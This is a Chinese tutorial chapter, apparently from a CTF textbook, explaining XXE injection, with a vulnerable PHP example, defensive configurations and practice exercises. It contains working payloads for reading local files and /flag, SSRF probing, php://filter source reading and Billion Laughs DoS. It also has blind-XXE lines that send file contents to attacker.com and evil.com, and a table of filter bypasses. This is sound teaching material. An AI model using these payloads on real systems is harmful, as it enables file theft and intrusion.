# 第 14 章 XXE 外部实体注入

## 本章目标

读完这一章，你将能够：

- 理解 XML、DTD、实体的基本概念
- 说清楚 XXE 的本质："XML 里的实体引用被解析成外部资源"
- 构造 XXE payload 读取本地文件、探测内网
- 了解盲 XXE、参数实体等进阶手法
- 知道 XXE 的防御方法

> XXE（XML External Entity，XML 外部实体注入）是 CTF 里 Misc 和 Web 都会考的漏洞。它利用 XML 解析器的"外部实体"功能，让服务器去读取本地文件或访问内网。理解它需要一点 XML 基础，我们从零讲起。

---

## 14.1 XML 基础：从没接触过也能懂

### 14.1.1 XML 是什么

XML（Extensible Markup Language）是一种用标签描述数据的格式，长得像 HTML，但标签是自定义的：

```xml
<?xml version="1.0"?>
<user>
  <name>admin</name>
  <age>25</age>
</user>
```

它常用于配置文件、数据交换（很多 API 接收 XML 格式的请求体）。

### 14.1.2 DTD 与实体

XML 有个叫 **DTD**（Document Type Definition，文档类型定义）的东西，可以定义"实体"（entity）——一种变量，在文档里用 `&名字;` 引用。

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY name "Alice">
]>
<user>&name;</user>
```

解析后，`&name;` 会被替换成 `Alice`，输出 `<user>Alice</user>`。

**关键**：实体不仅能定义**内部字符串**，还能定义**外部资源**——用 `SYSTEM` 关键字指定一个文件 URL 或网络 URL：

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

这定义了一个叫 `xxe` 的实体，它的内容是 `/etc/passwd` 文件的内容。当你在文档里用 `&xxe;` 引用它时，**XML 解析器会去读这个文件并替换进来**。

**这就是 XXE 的根源**：如果用户可以控制 XML 内容，他就能定义外部实体指向敏感文件，让解析器读取并返回。

**核心一句话**：**XML 解析器根据用户输入的定义，去读取了外部资源。** 又是"用户数据变成了指令"的模式。

---

## 14.2 漏洞示例

一个有漏洞的 XML 解析代码（PHP）：

```php
<?php
$xml = file_get_contents('php://input');  // 读取 POST 的 XML 请求体
$dom = new DOMDocument();
$dom->loadXML($xml);                       // 危险：默认会解析外部实体
echo $dom->textContent;
?>
```

攻击者发送恶意 XML：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

解析器读取 `/etc/passwd`，把内容替换到 `&xxe;`，页面就返回了 passwd 文件内容——**任意文件读取**。

---

## 14.3 XXE 能做什么

### 14.3.1 读取本地文件

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
```

CTF 里 flag 常在 `/flag`、`/etc/flag` 等路径。

### 14.3.2 探测内网 / SSRF

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
```

解析器去请求内网服务，返回内容——XXE 可以当 SSRF 用（呼应第 10 章）。

### 14.3.3 读取 PHP 源码的技巧

直接读 `.php` 文件时，源码里的 `<`、`&` 等字符会导致 XML 解析错误。用 `php://filter` 编码后再读：

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
```

读出来的是 Base64 编码的源码，解码即可（Base64 见第 16 章）。

### 14.3.4 拒绝服务（Billion Laughs）

定义嵌套实体指数级膨胀，耗尽内存：

```xml
<!ENTITY a "aaaaaaaaaa">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
...
```

解析时内容爆炸式增长，导致 DoS。

---

## 14.4 盲 XXE（Blind XXE）

如果服务器**不回显**解析结果（页面看不到文件内容），怎么办？用**参数实体**把数据外带到攻击者服务器。

**参数实体**：用 `%` 定义的实体（只能在 DTD 内部用），可以构造复杂攻击：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
<root></root>
```

解读：
- `%file` 读取 `/etc/passwd` 内容
- `%eval` 定义另一个实体 `exfil`，它的 URL 里带上 `%file` 的内容
- `%exfil` 触发请求，把文件内容当 URL 参数发到攻击者的服务器

攻击者在自己服务器看日志，就能收到 flag——**即使页面不回显**。

**小白问：为什么要这么绕？**
> 因为普通实体（&xxe;）只能在 XML 文档内容里引用，如果服务器不显示文档内容就没用。参数实体（%xxe;）能在 DTD 里嵌套定义，把读到的内容拼进一个 URL，让解析器主动"外带"数据出去。这是盲 XXE 的核心技巧。

---

## 14.5 实战流程

```
① 观察：找接收 XML 的功能（API 接口、文件上传的 XML、SOAP 服务）
② 假设：可能是 XXE
③ 验证：
   - 发送带 <!DOCTYPE> 的 XML，看是否报错/解析
   - 用 file:///etc/passwd 测试能否回显
④ 深入：
   - 读 flag 文件
   - php://filter 读源码
   - 不回显则用盲 XXE 外带
⑤ 归纳：记录有效的实体定义和 payload
```

**CTF 典型场景**：一个"XML 解析"或"导入配置"功能，给你一个 XML 输入框，让你读 flag。

---

## 14.6 XXE 的防御

| 措施 | 说明 |
|------|------|
| **禁用外部实体解析** | 根本解法：配置解析器禁止 DTD/外部实体 |
| PHP | `libxml_disable_entity_loader(true)`（老版本） |
| Java | 设置 `FEATURE_SECURE_PROCESSING`、禁用外部实体 |
| Python | lxml 用 `resolve_entities=False` |
| 输入校验 | 过滤 `<!DOCTYPE`、`<!ENTITY`（辅助） |
| 升级库 | 用默认禁用外部实体的新版解析库 |

**根本原则**：**XML 解析默认不该解析外部实体**——很多漏洞源于库的老旧默认配置。升级 + 显式禁用是正道。

---

## 14.6 深度拓展：XXE 的变体与绕过

14.1–14.6 覆盖了 XXE 的基础。这一节补充进阶内容——CTF 里 XXE 题的变形和绕过。

### 14.6.1 XML 与 HTML 的区别（为什么 XXE 只发生在 XML）

新手常问：为什么 HTML 里不能这么玩？

- **HTML**：标签是预定义的（`<p>`、`<div>`），不允许自定义 DTD/实体
- **XML**：标签可自定义，支持 DTD 定义实体——正是这个"可扩展性"带来了 XXE 风险

所以 XXE 只出现在"服务器解析 XML"的场景：API 接口、SOAP 服务、配置文件导入、Office 文档（docx/xlsx 本质是 XML）。

**CTF 拓展**：docx/xlsx 文件里藏 XXE——把恶意 DTD 塞进文档的 XML 里，如果服务端用有漏洞的库解析文档，同样触发 XXE。这是"文件上传 + XXE"的组合考点。

### 14.6.2 参数实体与普通实体的区别

这是理解盲 XXE 的关键：

| | 普通实体 | 参数实体 |
|---|---------|---------|
| 定义 | `<!ENTITY name "value">` | `<!ENTITY % name "value">` |
| 引用 | `&name;`（在文档内容里） | `%name;`（在 DTD 里） |
| 用途 | 在文档里替换内容 | 在 DTD 内部构造/拼接 |
| 盲 XXE | 无法外带（需回显） | 能外带（拼进 URL） |

**盲 XXE 的 payload 拆解**（再详细看一遍）：

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?d=%file;'>">
  %eval;
  %exfil;
]>
```

- `%file` 读取 `/flag` 内容
- `%eval` 是一个"生成实体定义的实体"——注意 `&#x25;` 是 `%` 的实体编码（避免嵌套 `%` 的语法冲突）
- `%eval;` 展开后定义了 `%exfil`
- `%exfil;` 触发 HTTP 请求，URL 里带着 flag 内容

**为什么这么绕**：XML 规范不允许在 DTD 里直接嵌套普通实体引用到 SYSTEM 标识符里，所以用参数实体+间接定义的方式绕过语法限制。

### 14.6.3 常见绕过

| 过滤 | 绕过 |
|------|------|
| 过滤 `SYSTEM` | 用小写 `system`（有些解析器不区分） |
| 过滤 `file://` | 用 `php://filter`、`http://`、`gopher://`、相对路径 |
| 过滤 `<!DOCTYPE` | 用编码、外部 DTD 文件 |
| 无回显 | 盲 XXE（参数实体外带） |
| 读不了带 `<` 的文件 | `php://filter/convert.base64-encode/resource=` 先编码 |

### 14.6.4 XXE 与其他漏洞的组合

| 组合 | 思路 |
|------|------|
| XXE + SSRF | XXE 的 SYSTEM 指向内网地址，效果等同 SSRF（第 10 章） |
| XXE + 文件上传 | 上传含 XXE 的 docx/xlsx，服务端解析时触发 |
| XXE + LFI | 用 file:// 读源码，找其他漏洞 |
| XXE + DoS | Billion Laughs 实体膨胀 |

**CTF 心法**：XXE 常是"链条的一环"——用它读源码/配置，再用读到的信息打下一个漏洞。别把 XXE 当成终点。

### 14.6.5 各语言的 XXE 防御配置

| 语言 | 危险配置 | 安全配置 |
|------|---------|---------|
| PHP | `DOMDocument::loadXML` 默认解析实体 | `libxml_disable_entity_loader(true)`（PHP 8 前） |
| Java | `DocumentBuilderFactory` 默认 | 设 `FEATURE_SECURE_PROCESSING`，禁外部实体 |
| Python | lxml 的 `resolve_entities=True` | `resolve_entities=False` |
| .NET | `XmlReader` 默认 | `DtdProcessing = Prohibit` |

**理解防御的价值**：CTF 里如果你发现 XXE 打不通，可能是出题人用了安全配置——这时要么换考点，要么找配置遗漏（如只禁了外部通用实体，没禁参数实体）。

---

## 14.7 本章总结

| 知识点 | 核心要点 |
|--------|---------|
| XML/DTD/实体 | 实体是变量；`SYSTEM "file:///..."` 定义外部实体 |
| XXE 本质 | 解析器按用户定义读取外部资源 |
| 利用 | 读本地文件、内网 SSRF、php://filter 读源码、DoS |
| 盲 XXE | 参数实体把数据外带到攻击者服务器 |
| 防御 | 显式禁用外部实体解析 + 升级库 |

---

## 本章练习

1. 在本地搭一个接收 XML 的 PHP 页面，用 `file:///etc/passwd` 测试 XXE（授权环境）。
2. 用 `php://filter/convert.base64-encode/resource=` 读一个 PHP 文件，解码看源码。
3. 找一道 CTF 的 XXE 题（BuuCTF 有），实践回显型 XXE。
4. 理解盲 XXE 的参数实体 payload，画出数据外带的流程图。
5. 查资料：你用的 XML 解析库默认是否允许外部实体？如何禁用？

---

**下一章预告**：第 15 章讲逻辑漏洞与条件竞争——这类漏洞不靠"代码注入"，而是利用**业务流程设计缺陷**（如越权改密码、支付金额篡改、条件竞争）来牟利。它是 Web 漏洞里"最像脑筋急转弯"的一类，也是第三卷的收官。
